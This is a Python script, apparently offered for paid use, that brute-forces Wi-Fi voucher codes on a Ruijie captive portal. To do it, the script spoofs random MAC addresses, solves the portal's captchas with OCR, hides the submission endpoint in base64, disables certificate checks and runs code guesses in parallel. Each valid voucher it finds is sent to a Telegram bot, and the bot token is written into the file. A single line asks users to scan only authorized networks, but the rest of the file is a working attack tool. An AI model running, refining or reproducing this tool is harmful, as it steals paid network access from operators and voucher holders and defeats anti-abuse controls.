#!/usr/bin/env python3
# ==============================================
#  FLASH X VOUCHER SCANNER  —  v1.1
#  - Flash X Edition
#  - @FlashXteam098 async scan engine
#  - Telegram notifications
#  - Real-time stats
#  - Key System (GitHub-hosted)
# ==============================================

import asyncio
import aiohttp
import base64
import random
import re
import string
import json
import time
import sys
import os
import threading
import ssl
from datetime import datetime, timezone
import urllib3

try:
    import cv2
    import ddddocr
    import numpy as np
    _HAS_OCR = True
except ImportError:
    _HAS_OCR = False

# ==================== SSL BYPASS ====================
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============================================
#  COLORS
# =============================================
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    GRAY    = "\033[90m"

def cprint(text, color=C.WHITE, bold=False, end="\n"):
    b = C.BOLD if bold else ""
    print(f"{b}{color}{text}{C.RESET}", end=end)

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# =============================================
#  CONFIGURATION
# =============================================

# Flash X — LayWaDiKyaung Network URL
TARGET_URL = "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=984a6b458306&gw_sn=H1T0788002370&gw_address=192.168.90.254&gw_port=2060&ip=192.168.90.112&mac=12:f9:d2:35:d6:bd&slot_num=34&nasip=192.168.1.132&ssid=VLAN90&ustate=0&mac_req=1&url=http%3A%2F%2Fconnectivitycheck%2Egstatic%2Ecom%2Fgenerate%5F204&chap_id=%5C364&chap_challenge=%5C211%5C167%5C107%5C174%5C321%5C263%5C175%5C301%5C375%5C024%5C262%5C315%5C156%5C347%5C246%5C034"

# Flash X — Telegram Bot
TELEGRAM_BOT_TOKEN = "8983678848:AAFzjkN6RyC7mv6XvKroNcfUxb1J6hoCRb0"
TELEGRAM_CHAT_ID   = "8655093528"

# ===== KEY SYSTEM (GitHub) =====
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
GITHUB_OWNER = "mlbbstar46-cloud"
GITHUB_REPO  = "Flash-x-team"
KEYS_FILE    = "flashx_keys.json"
ADMIN_USERNAME = "@FlashXteam098"

# Scan Settings
THREADS = 50

# Result Files — Home directory
HOME_DIR = os.path.expanduser("~")
FOUND_FILE  = os.path.join(HOME_DIR, "flashx_found.txt")
RESULT_FILE = os.path.join(HOME_DIR, "flashx_results.txt")

# =============================================
#  GLOBALS
# =============================================
_connector   = None
_voucher_sem = None
_ocr         = None
stop_flag    = False
found_codes  = []
limited_codes = []
retry_total  = 0
tried        = 0
hits         = []
lock         = threading.Lock()
start_time   = None

# =============================================
#  KEY SYSTEM
# =============================================
async def fetch_keys():
    """GitHub ကနေ keys ကို load လုပ်ပါ"""
    url = f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/contents/{KEYS_FILE}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status == 200:
                    data = await r.json()
                    content = base64.b64decode(data['content']).decode('utf-8')
                    return json.loads(content)
                return {}
    except:
        return {}

def check_key_expiration(expiry):
    """Key သက်တမ်း စစ်ပါ"""
    try:
        if expiry == "9999-12-31T23:59:59Z":
            return True
        exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
        return datetime.now(timezone.utc) < exp_time
    except:
        return False

async def verify_key(user_key):
    """User Key ကို verify လုပ်ပါ"""
    keys = await fetch_keys()
    
    if not keys:
        return None, "❌ Cannot connect to key server"
    
    for uid, data in keys.items():
        stored_key = data.get("key", "")
        if stored_key == user_key:
            expiry = data.get("expiry", "")
            if check_key_expiration(expiry):
                return uid, data
            else:
                return None, "❌ Key Expired"
    
    return None, "❌ Invalid Key"

# =============================================
#  BANNER — Flash X Edition
# =============================================
def print_banner():
    clear_screen()
    R = C.RED; G = C.GREEN; Y = C.YELLOW; Cy = C.CYAN; M = C.MAGENTA
    B = C.BOLD; Rs = C.RESET
    H = "\u2501"
    print(f"{M}{B}\u250f{H*54}\u2513{Rs}")
    print(f"{M}{B}\u2503{Rs}                                                      {M}{B}\u2503{Rs}")
    print(f"{M}{B}\u2503{Rs}  {Cy}      ███████╗██╗      █████╗ ███████╗██╗  ██╗     {M}{B}\u2503{Rs}")
    print(f"{M}{B}\u2503{Rs}  {Cy}      ██╔════╝██║     ██╔══██╗██╔════╝██║  ██║     {M}{B}\u2503{Rs}")
    print(f"{M}{B}\u2503{Rs}  {Cy}      █████╗  ██║     ███████║███████╗███████║     {M}{B}\u2503{Rs}")
    print(f"{M}{B}\u2503{Rs}  {Cy}      ██╔══╝  ██║     ██╔══██║╚════██║██╔══██║     {M}{B}\u2503{Rs}")
    print(f"{M}{B}\u2503{Rs}  {Cy}      ██║     ███████╗██║  ██║███████║██║  ██║     {M}{B}\u2503{Rs}")
    print(f"{M}{B}\u2503{Rs}  {Cy}      ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝     {M}{B}\u2503{Rs}")
    print(f"{M}{B}\u2503{Rs}                                                      {M}{B}\u2503{Rs}")
    print(f"{M}{B}\u2523{H*54}\u252b{Rs}")
    print(f"{M}{B}\u2503{Rs}  {G}{B}      🚀  FLASH X VOUCHER SCANNER  🚀              {M}{B}\u2503{Rs}")
    print(f"{M}{B}\u2503{Rs}  {Y}          ✨ Flash X Edition ✨                     {M}{B}\u2503{Rs}")
    print(f"{M}{B}\u2503{Rs}  {R}          ⚡ Speed Mode Active ⚡                    {M}{B}\u2503{Rs}")
    print(f"{M}{B}\u2503{Rs}  {Cy}          👨‍💻 @FlashXteam098                       {M}{B}\u2503{Rs}")
    print(f"{M}{B}\u2503{Rs}  {G}          🔑 Key Protected 🔑                       {M}{B}\u2503{Rs}")
    print(f"{M}{B}\u2517{H*54}\u251b{Rs}")
    print()

# =============================================
#  KEY LOGIN
# =============================================
async def key_login():
    """User ကို Key တောင်းပြီး verify လုပ်ပါ"""
    print_banner()
    
    cprint("  ╔════════════════════════════════════════════╗", C.YELLOW, bold=True)
    cprint("  ║          🔑 KEY AUTHENTICATION 🔑            ║", C.YELLOW, bold=True)
    cprint("  ╚════════════════════════════════════════════╝", C.YELLOW, bold=True)
    print()
    
    cprint(f"  👨‍💻 Admin: {ADMIN_USERNAME}", C.CYAN, bold=True)
    cprint(f"  📞 Key ရရှိရန် Admin ဆီ ဆက်သွယ်ပါ", C.GRAY)
    print()
    
    key = input(f"  {C.CYAN}{C.BOLD}[🔑] Enter your key: {C.RESET}").strip()
    
    if not key:
        cprint("  ❌ No key provided.", C.RED, bold=True)
        return None, None
    
    print()
    cprint("  ⏳ Verifying key...", C.YELLOW)
    
    uid, data = await verify_key(key)
    
    if uid:
        cprint(f"  ✅ Key Valid!", C.GREEN, bold=True)
        cprint(f"  👤 User ID: {uid}", C.CYAN)
        cprint(f"  📋 Plan: {data.get('plan', 'Unknown')}", C.CYAN)
        cprint(f"  ⏰ Expires: {data.get('expiry', 'Unknown')}", C.CYAN)
        print()
        input(f"  {C.GREEN}[✓] Press Enter to continue...{C.RESET}")
        return uid, data
    else:
        cprint(f"  {data}", C.RED, bold=True)
        print()
        cprint(f"  👨‍💻 Admin: {ADMIN_USERNAME}", C.CYAN)
        cprint(f"  📞 Admin ဆီ ဆက်သွယ်ပါ", C.GRAY)
        return None, None

# =============================================
#  TELEGRAM
# =============================================
async def send_telegram_async(message):
    if not TELEGRAM_BOT_TOKEN:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        async with aiohttp.ClientSession() as s:
            await s.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=aiohttp.ClientTimeout(total=5))
    except:
        pass

# =============================================
#  NETWORK HELPERS
# =============================================
def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

async def get_session_id(sess, session_url, previous=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'upgrade-insecure-requests': '1',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else previous
    except:
        return previous

# =============================================
#  CAPTCHA
# =============================================
def _init_ocr():
    global _ocr
    if _ocr is None and _HAS_OCR:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except:
            _ocr = None
    return _ocr

def _ocr_sync(image_bytes):
    ocr = _init_ocr()
    if ocr is None:
        return None
    try:
        nparr = np.frombuffer(image_bytes, np.uint8)
        img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None:
            return None
        gray  = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        blur  = cv2.GaussianBlur(gray, (3, 3), 0)
        _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
        _, buf = cv2.imencode('.png', th)
        return ocr.classification(buf.tobytes()).upper()
    except:
        return None

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Captcha_Image(sess, session_id):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'image/*,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    try:
        async with sess.get(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
            params={'sessionId': session_id, '_t': str(time.time())},
            headers=h, ssl=False
        ) as r:
            return await r.read()
    except:
        return None

async def Varify_Captcha(sess, session_id, text):
    h = {
        'authority': 'portal-as.ruijienetworks.com',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    }
    try:
        async with sess.post(
            'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
            headers=h, json={'sessionId': session_id, 'authCode': text}, ssl=False
        ) as r:
            d = await r.json()
            return session_id if d.get("success") is True else None
    except:
        return None

# =============================================
#  BALANCE CHECK
# =============================================
async def Code_Expires_Date(session_id):
    h_auth = {
        'authority': 'portal-as.ruijienetworks.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }
    endpoints = [
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
    ]
    for url in endpoints:
        try:
            async with aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=15)
            ) as s:
                async with s.get(url, headers=h_auth, ssl=False) as r:
                    data = await r.json()
                    res  = data.get('result', {})
                    plan = res.get('profileName', 'Unknown')
                    remaining = res.get('remainingMinutes')
                    if remaining is not None:
                        remaining = int(remaining)
                        if remaining >= 0:
                            hh, mm = divmod(remaining, 60)
                            time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        else:
                            time_str = f"Expired ({remaining} mins)"
                        return f"Plan: {plan} | Time: {time_str}"
                    total = res.get('totalMinutes')
                    if total is not None:
                        hh, mm = divmod(int(total), 60)
                        time_str = f"{hh}h {mm}m" if hh else f"{mm}m"
                        return f"Plan: {plan} | Time: {time_str}"
        except:
            continue
    return "Plan:Unknown | Time:Unknown"

# =============================================
#  POST ENDPOINT
# =============================================
_post_url = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

# =============================================
#  CORE CHECK
# =============================================
async def perform_check(session_url, code):
    global retry_total, tried, hits

    response = None
    session_id = None

    for attempt in range(3):
        try:
            async with aiohttp.ClientSession(
                connector=_connector, connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=30)
            ) as sess:
                session_id = await get_session_id(sess, session_url)
                if not session_id:
                    return

                auth_code = None
                if _HAS_OCR:
                    for _ in range(8):
                        try:
                            img      = await Captcha_Image(sess, session_id)
                            if not img:
                                continue
                            text     = await Captcha_Text(img)
                            if not text:
                                continue
                            verified = await Varify_Captcha(sess, session_id, text)
                            if verified:
                                auth_code = text
                                break
                        except:
                            pass

                if not auth_code:
                    return

                if stop_flag:
                    return

                payload = {
                    "accessCode": code,
                    "sessionId":  session_id,
                    "apiVersion": 1,
                    "authCode":   auth_code,
                }
                headers = {
                    "authority":    "portal-as.ruijienetworks.com",
                    "accept":       "*/*",
                    "content-type": "application/json",
                    "origin":       "https://portal-as.ruijienetworks.com",
                    "user-agent":   "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 "
                                    "(KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                }
                async with sess.post(_post_url, json=payload, headers=headers, ssl=False) as r:
                    response = await r.text()
        except:
            return

        if response and 'request limited' in response:
            retry_total += 1
            await asyncio.sleep(0.5)
            continue
        break

    if not response:
        return

    with lock:
        tried += 1

    if 'logonUrl' in response:
        info = await Code_Expires_Date(session_id)
        found_codes.append(f"{code} | {info}")
        with lock:
            hits.append(code)
        try:
            with open(RESULT_FILE, "a", encoding="utf-8") as f:
                f.write(f"[SUCCESS] {code}  |  {info}\n")
        except:
            pass
        await send_telegram_async(f"🚀 FLASH X HIT!\n\n✅ Voucher: {code}\n📋 {info}\n\n👨‍💻 @FlashXteam098")
        print(f"\n[+] SUCCESS CODE: {code} | {info}")

    elif 'STA' in response:
        info = await Code_Expires_Date(session_id)
        limited_codes.append(f"{code} | {info}")
        try:
            with open(RESULT_FILE, "a", encoding="utf-8") as f:
                f.write(f"[LIMITED] {code}  |  {info}\n")
        except:
            pass
        print(f"\n[-] LIMITED CODE: {code} | {info}")

# =============================================
#  CODE ITERATORS
# =============================================
def iter_range_codes(start, end):
    digits = max(len(str(start)), len(str(end)))
    codes = [str(i).zfill(digits) for i in range(start, end + 1)]
    random.shuffle(codes)
    for c in codes:
        yield c

def iter_random_codes(length):
    while True:
        yield "".join(random.choice(string.digits) for _ in range(length))

def iter_letter_codes(length):
    while True:
        yield "".join(random.choice(string.ascii_lowercase) for _ in range(length))

def iter_mixed_codes(length):
    pool = string.ascii_lowercase + string.digits
    while True:
        yield "".join(random.choice(pool) for _ in range(length))

# =============================================
#  STATS PRINTER
# =============================================
def stats_printer():
    while not stop_flag:
        time.sleep(1)
        try:
            elapsed = time.time() - start_time
            speed = tried / elapsed if elapsed > 0 else 0
            sys.stdout.write(f"\r\U0001F552 SPEED: {speed:.1f} c/s | TRIED: {tried} | HITS: {len(hits)}")
            sys.stdout.flush()
        except:
            pass
    print()

# =============================================
#  RUN SCAN
# =============================================
async def run_scan(session_url, start_code, end_code, workers):
    global _voucher_sem, stop_flag, _connector, tried, hits
    global found_codes, limited_codes, retry_total, start_time

    _init_ocr()

    tried          = 0
    hits           = []
    found_codes    = []
    limited_codes  = []
    retry_total    = 0
    stop_flag      = False

    _connector   = aiohttp.TCPConnector(limit=workers + 100, ssl=False)
    _voucher_sem = asyncio.Semaphore(workers)

    digits = max(len(str(start_code)), len(str(end_code)))
    total = end_code - start_code + 1
    code_iter = iter_range_codes(start_code, end_code)

    cprint(f"\n  [+] Mode: Digit-only ({digits}-digit)", C.CYAN, bold=True)
    cprint(f"  [+] Range: {str(start_code).zfill(digits)} → {str(end_code).zfill(digits)} ({total:,} codes)", C.YELLOW)
    cprint(f"  [+] Workers: {workers}\n", C.GREEN)

    start_time = time.time()
    stats_thread = threading.Thread(target=stats_printer, daemon=True)
    stats_thread.start()

    checked = 0
    try:
        while not stop_flag:
            batch = []
            for _ in range(500):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    await perform_check(session_url, c)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)

    except (asyncio.CancelledError, KeyboardInterrupt):
        stop_flag = True
    finally:
        try:
            await _connector.close()
        except:
            pass

    elapsed = time.time() - start_time
    cprint(f"\n  [+] Completed in {elapsed:.2f} seconds", C.GREEN, bold=True)
    cprint(f"      Checked: {checked} | Found: {len(found_codes)} | Limited: {len(limited_codes)} | Retries: {retry_total}", C.CYAN)
    if hits:
        cprint(f"  [+] Voucher found: {hits[0]}", C.GREEN, bold=True)
        with open(FOUND_FILE, "w") as f:
            f.write(f"{hits[0]}\n")
        if found_codes:
            cprint("  [+] All success codes:", C.YELLOW)
            for c in found_codes:
                cprint(f"      {c}", C.GREEN)
        await send_telegram_async(f"✅ Scan Completed!\n\n📊 Found: {len(found_codes)}\n✅ Best: {hits[0]}\n\n👨‍💻 @FlashXteam098")
    else:
        cprint("  [-] No valid voucher found in range.", C.RED)
        await send_telegram_async(f"❌ Scan Completed\n\n📊 Tried: {tried}\n❌ No hits\n\n👨‍💻 @FlashXteam098")

# =============================================
#  RANDOM SCAN
# =============================================
async def _run_random_scan(session_url, length, workers, mode_type="digit"):
    global _voucher_sem, stop_flag, _connector, tried, hits
    global found_codes, limited_codes, retry_total, start_time

    _init_ocr()

    tried          = 0
    hits           = []
    found_codes    = []
    limited_codes  = []
    retry_total    = 0
    stop_flag      = False

    _connector   = aiohttp.TCPConnector(limit=workers + 100, ssl=False)
    _voucher_sem = asyncio.Semaphore(workers)

    if mode_type == "letter":
        code_iter = iter_letter_codes(length)
        mode_label = f"Letter-only ({length}-char a-z)"
    elif mode_type == "mixed":
        code_iter = iter_mixed_codes(length)
        mode_label = f"Mixed ({length}-char a-z+0-9)"
    else:
        code_iter = iter_random_codes(length)
        mode_label = f"Digit-only ({length}-digit)"

    cprint(f"\n  [+] Mode: {mode_label}", C.CYAN, bold=True)
    cprint(f"  [+] Workers: {workers} | Infinite random scan\n", C.YELLOW)

    start_time = time.time()
    stats_thread = threading.Thread(target=stats_printer, daemon=True)
    stats_thread.start()

    checked = 0
    try:
        while not stop_flag:
            batch = []
            for _ in range(500):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    await perform_check(session_url, c)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)

    except (asyncio.CancelledError, KeyboardInterrupt):
        stop_flag = True
    finally:
        try:
            await _connector.close()
        except:
            pass

    elapsed = time.time() - start_time
    cprint(f"\n  [+] Completed in {elapsed:.2f} seconds", C.GREEN, bold=True)
    cprint(f"      Checked: {checked} | Found: {len(found_codes)} | Limited: {len(limited_codes)} | Retries: {retry_total}", C.CYAN)
    if hits:
        cprint(f"  [+] Voucher found: {hits[0]}", C.GREEN, bold=True)
        with open(FOUND_FILE, "w") as f:
            f.write(f"{hits[0]}\n")
    else:
        cprint("  [-] No valid voucher found.", C.RED)

# =============================================
#  MODE SELECT
# =============================================
def select_mode():
    clear_screen()
    print_banner()

    cprint("  ╔════════════════════════════════════════════╗", C.MAGENTA, bold=True)
    cprint("  ║          ✨ SELECT SCAN MODE ✨              ║", C.MAGENTA, bold=True)
    cprint("  ╚════════════════════════════════════════════╝", C.MAGENTA, bold=True)
    print()

    cprint("  ┌────────────────────────────────────────────┐", C.CYAN, bold=True)
    cprint("  │  🔢  DIGIT ONLY  (ဂဏန်းသီးသန့်)          │", C.CYAN, bold=True)
    cprint("  └────────────────────────────────────────────┘", C.CYAN, bold=True)
    cprint("     ❶  6-digit      000000 ➞ 999999       ", C.YELLOW)
    cprint("     ❷  7-digit      0000000 ➞ 9999999     ", C.YELLOW)
    cprint("     ❸  8-digit      00000000 ➞ 99999999   ", C.YELLOW)
    cprint("     ❹  9-digit      000000000 ➞ 999999999 ", C.YELLOW)
    cprint("     ❺  Custom range (enter start & end)   ", C.YELLOW)
    print()

    cprint("  ┌────────────────────────────────────────────┐", C.GREEN, bold=True)
    cprint("  │  🔤  LETTER ONLY  (အက္ခရာသီးသန့်)        │", C.GREEN, bold=True)
    cprint("  └────────────────────────────────────────────┘", C.GREEN, bold=True)
    cprint("     ❻  6-letter     aaaaaa ➞ zzzzzz       ", C.GREEN)
    cprint("     ❼  7-letter     aaaaaaa ➞ zzzzzzz     ", C.GREEN)
    cprint("     ❽  8-letter     aaaaaaaa ➞ zzzzzzzz   ", C.GREEN)
    print()

    cprint("  ┌────────────────────────────────────────────┐", C.MAGENTA, bold=True)
    cprint("  │  🔀  MIXED  (ဂဏန်း+အက္ခရာ)              │", C.MAGENTA, bold=True)
    cprint("  └────────────────────────────────────────────┘", C.MAGENTA, bold=True)
    cprint("     ❾  6-mixed      a-z + 0-9  (6 chars)  ", C.MAGENTA)
    cprint("     ❿  7-mixed      a-z + 0-9  (7 chars)  ", C.MAGENTA)
    cprint("     ⓫  8-mixed      a-z + 0-9  (8 chars)  ", C.MAGENTA)
    print()

    choice = input(f"  {C.CYAN}{C.BOLD}[💬] Select mode (1-11): {C.RESET}").strip()
    return choice

# =============================================
#  MAIN
# =============================================
async def main():
    global stop_flag

    # Step 1: Key Login
    uid, user_data = await key_login()
    
    if not uid:
        cprint("\n  ❌ Authentication failed. Exiting...", C.RED, bold=True)
        sys.exit(1)
    
    # Step 2: URL
    clear_screen()
    print_banner()
    
    cprint("  ── TARGET URL ──────────────────────────────", C.BLUE, bold=True)
    cprint(f"  Default: {TARGET_URL[:60]}...", C.GRAY)
    use_default = input(f"  {C.CYAN}[?] Use default URL? (y/n): {C.RESET}").strip().lower()
    if use_default == "y" or use_default == "":
        session_url = TARGET_URL
    else:
        session_url = input(f"  {C.CYAN}[?] Enter Session URL: {C.RESET}").strip()
        if not session_url:
            cprint("  [-] No URL provided. Using default.", C.RED)
            session_url = TARGET_URL
    cprint(f"  [+] Target set.", C.GREEN)
    print()

    # Step 3: Mode
    choice = select_mode()

    mode_type = None
    length = None
    start_code = 0
    end_code = 0

    if choice == "1":
        mode_type = "digit"; start_code = 0; end_code = 999999
    elif choice == "2":
        mode_type = "digit"; start_code = 0; end_code = 9999999
    elif choice == "3":
        mode_type = "digit"; start_code = 0; end_code = 99999999
    elif choice == "4":
        mode_type = "digit"; start_code = 0; end_code = 999999999
    elif choice == "5":
        mode_type = "custom"
        try:
            start_code = int(input(f"  {C.CYAN}[?] Start code: {C.RESET}").strip())
            end_code   = int(input(f"  {C.CYAN}[?] End code: {C.RESET}").strip())
        except ValueError:
            cprint("  [-] Invalid number. Using 6-digit default.", C.RED)
            mode_type = "digit"; start_code = 0; end_code = 999999
    elif choice == "6":
        mode_type = "letter"; length = 6
    elif choice == "7":
        mode_type = "letter"; length = 7
    elif choice == "8":
        mode_type = "letter"; length = 8
    elif choice == "9":
        mode_type = "mixed"; length = 6
    elif choice == "10":
        mode_type = "mixed"; length = 7
    elif choice == "11":
        mode_type = "mixed"; length = 8
    else:
        cprint("  [-] Invalid choice. Using 6-digit default.", C.RED)
        mode_type = "digit"; start_code = 0; end_code = 999999

    print()

    # Step 4: Workers
    cprint("  ── CONFIGURATION ───────────────────────────", C.BLUE, bold=True)
    workers_inp = input(f"  {C.CYAN}[?] Workers (default {THREADS}): {C.RESET}").strip()
    try:
        workers = int(workers_inp) if workers_inp else THREADS
    except ValueError:
        workers = THREADS

    print()
    cprint("  +===========================================+", C.MAGENTA, bold=True)
    cprint("  |              SCAN SUMMARY                 |", C.MAGENTA, bold=True)
    cprint("  +===========================================+", C.MAGENTA, bold=True)

    if mode_type in ("digit", "custom"):
        digits = max(len(str(start_code)), len(str(end_code)))
        cprint(f"  |  Mode:   {C.YELLOW}Digit-only{C.MAGENTA} ({digits}-digit)", C.MAGENTA)
        cprint(f"  |  Range:  {C.YELLOW}{str(start_code).zfill(digits)} → {str(end_code).zfill(digits)}{C.MAGENTA}", C.MAGENTA)
    elif mode_type == "letter":
        cprint(f"  |  Mode:   {C.GREEN}Letter-only{C.MAGENTA} ({length}-char)", C.MAGENTA)
    elif mode_type == "mixed":
        cprint(f"  |  Mode:   {C.MAGENTA}Mixed{C.MAGENTA} ({length}-char)", C.MAGENTA)

    cprint(f"  |  Workers:{C.CYAN} {workers}", C.MAGENTA)
    if _HAS_OCR:
        cprint(f"  |  Captcha:{C.GREEN} ddddocr ✓", C.MAGENTA)
    else:
        cprint(f"  |  Captcha:{C.RED} NOT installed", C.MAGENTA)
    cprint(f"  |  Telegram:{C.GREEN} Enabled ✓", C.MAGENTA)
    cprint("  +===========================================+", C.MAGENTA, bold=True)
    print()

    cprint("  [!] Use only on authorized networks!", C.RED, bold=True)
    confirm = input(f"  {C.YELLOW}{C.BOLD}[?] Type 'yes' to start: {C.RESET}").strip().lower()
    if confirm != "yes":
        cprint("  [-] Aborted.", C.RED)
        sys.exit(0)

    if mode_type in ("letter", "mixed"):
        await _run_random_scan(session_url, length, workers, mode_type)
    else:
        await run_scan(session_url, start_code, end_code, workers)

# =============================================
#  ENTRY
# =============================================
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        stop_flag = True
        cprint("\n  [!] Interrupted by user.", C.YELLOW)
        sys.exit(0)
